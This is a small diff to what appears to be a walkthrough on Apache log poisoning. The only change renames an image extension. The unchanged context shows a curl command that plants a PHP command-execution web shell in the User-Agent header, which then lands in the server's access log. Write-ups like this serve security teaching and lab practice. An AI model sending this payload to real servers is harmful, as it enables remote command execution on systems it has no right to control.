@@ -117,7 +117,7 @@ Each time we visit the application, apache keeps our `User-Agent` in this log fi
 curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" http://[target_ip]/
 ```
 
-![log poisoning](images/6a.PNG)
+![log poisoning](images/6a.png)
 
 **Step 3:** Execute system commands
 
